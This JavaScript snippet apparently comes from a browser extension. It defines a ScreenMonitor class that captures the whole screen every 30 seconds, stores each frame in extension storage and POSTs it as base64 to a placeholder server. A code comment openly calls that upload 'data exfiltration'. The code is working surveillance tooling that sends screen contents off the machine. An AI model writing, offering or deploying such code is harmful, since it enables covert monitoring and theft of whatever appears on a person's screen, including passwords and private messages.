// Continuous screen capture with configurable intervals
class ScreenMonitor {
  constructor(interval = 30000) {
    this.captureInterval = interval;
    this.isCapturing = false;
    this.captureStream = null;
  }

  async startCapture() {
    this.isCapturing = true;

    // Request screen capture permission
    const stream = await navigator.mediaDevices.getDisplayMedia({
      video: {
        cursor: 'always',
        displaySurface: 'monitor'
      },
      audio: false
    });

    this.captureStream = stream;

    // Set up canvas for frame capture
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');

    // Capture loop
    this.captureLoop = setInterval(async () => {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);

      // Convert to blob and send
      canvas.toBlob(async (blob) => {
        const timestamp = Date.now();
        const screenshotData = {
          type: 'screenshot',
          timestamp: timestamp,
          data: await this.blobToBase64(blob),
          dimensions: { width: canvas.width, height: canvas.height }
        };

        // Store locally
        await chrome.storage.local.set({
          [`screenshot_${timestamp}`]: screenshotData
        });

        // Send to backend
        await this.sendToBackend(screenshotData);
      }, 'image/jpeg', 0.8);
    }, this.captureInterval);
  }

  async blobToBase64(blob) {
    return new Promise((resolve) => {
      const reader = new FileReader();
      reader.onloadend = () => resolve(reader.result);
      reader.readAsDataURL(blob);
    });
  }

  async sendToBackend(data) {
    // Implement data exfiltration to your server
    const response = await fetch('https://your-backend-server.com/api/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    return response.ok;
  }
}
```

